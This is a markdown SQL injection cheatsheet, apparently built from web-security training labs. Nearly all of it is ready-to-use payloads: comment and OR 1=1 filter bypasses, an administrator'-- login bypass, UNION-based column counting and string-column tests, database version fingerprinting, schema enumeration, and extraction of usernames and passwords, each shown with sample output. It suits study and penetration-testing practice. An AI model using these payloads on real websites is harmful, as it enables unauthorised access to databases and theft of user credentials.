# SQL Injection Cheatsheet

## Common Injection Points
- `WHERE` clause
- `INSERT` statements
- `SELECT` table/column names
- `ORDER BY` clause

---

## Retrieving Hidden Data
- **Basic Injection**: `'--`
  - `https://site.com/products?category=Gifts'--`
  - Bypasses filters.
- **Retrieve All Data**: `' OR 1=1--`
  - `https://site.com/products?category=Gifts'+OR+1=1--`
  - Returns all products.
- **Quick Tips**:
  - Append `'--` to ignore filters.
  - Use `OR 1=1` to retrieve everything.

---

## Bypassing Authentication
- **Bypass Login**: `administrator'--`
  - Username: `admin'--`
  - Password: (anything or blank)
  - Logs in without a password.

---

## SQL Injection UNION Attacks

### 1. Find Number of Columns
- **Using `ORDER BY`**:
  - `' ORDER BY 1--`
  - Increment until an error occurs.
- **Using `UNION SELECT NULL`**:
  - `' UNION SELECT NULL--`
  - Add `NULL` until no error occurs.

### 2. Identify Usable Columns
- `' UNION SELECT 'a',NULL,NULL--`
- `' UNION SELECT NULL,'a',NULL--`
- `' UNION SELECT NULL,NULL,'a'--`
- Column where `'a'` appears supports string data.

### 3. Extract Data
- `' UNION SELECT username, password FROM users--`
  - Retrieves usernames and passwords.

**Example**:
- `https://site.com/products?category=Gifts' UNION SELECT username, password FROM users--`

---

## Finding Columns with String Data

### 1. Steps
1. Find number of columns (`ORDER BY` or `UNION SELECT NULL`).
2. Test string compatibility by injecting `'a'`.

### 2. Payloads (for 4 columns)
- `' UNION SELECT 'a',NULL,NULL,NULL--`
- `' UNION SELECT NULL,'a',NULL,NULL--`
- `' UNION SELECT NULL,NULL,'a',NULL--`
- `' UNION SELECT NULL,NULL,NULL,'a'--`

### 3. Interpretation
- **Success**: `'a'` appears → column supports string data.
- **Error**: Data type mismatch.

**Example**:
- `https://site.com/products?category=Gifts' UNION SELECT NULL,'a',NULL--`
- Confirms if the second column supports string data.

---

## SQL Injection: Examining the Database

### Determine Database Type and Version
- **Microsoft, MySQL**: `SELECT @@version`
- **Oracle**: `SELECT * FROM v$version`
- **PostgreSQL**: `SELECT version()`
- **Example**: `' UNION SELECT @@version--`
  - Output: Identifies database type and version.

---

### Listing Database Contents
#### Non-Oracle Databases
- **List Tables**: `SELECT * FROM information_schema.tables`
- **List Columns in a Table**: `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

#### Oracle Databases
- **List Tables**: `SELECT * FROM all_tables`
- **List Columns**: `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

---

## SQL Injection: UNION Attacks

### Retrieve Data from Other Tables
- **Basic Attack**: `' UNION SELECT username, password FROM users--`
  - Requires knowledge of table and column names.

### Retrieve Multiple Values in One Column
- **Oracle**: `' UNION SELECT username || '~' || password FROM users--`
  - Uses `||` for string concatenation.
- **Example Output**:
  ```
  administrator~s3cure
  wiener~peter
  carlos~montoya
  ```
- **Different databases have different concatenation syntax.**

---

### Examining the Database in SQL Injection Attacks

#### **Determining Database Type and Version**

Use the following queries to identify the database type and version:

| Database | Query |
|----------|---------------------------------|
| Microsoft SQL Server | `SELECT @@version` |
| MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

**Example UNION Attack:**
```sql
' UNION SELECT @@version--
```
**Example Output (Microsoft SQL Server):**
```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Standard Edition (64-bit) on Windows Server 2016
```

---

#### **Listing Database Contents**

Most databases (except Oracle) use `information_schema` to list database objects.

##### **List All Tables**
```sql
SELECT * FROM information_schema.tables
```
**Example Output:**
```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
--------------------------------------------------
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

##### **List Columns in a Table**
```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```
**Example Output:**
```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
----------------------------------------------------------------
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

---

#### **Listing Database Contents on Oracle**

##### **List All Tables**
```sql
SELECT * FROM all_tables
```

##### **List Columns in a Table**
```sql
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

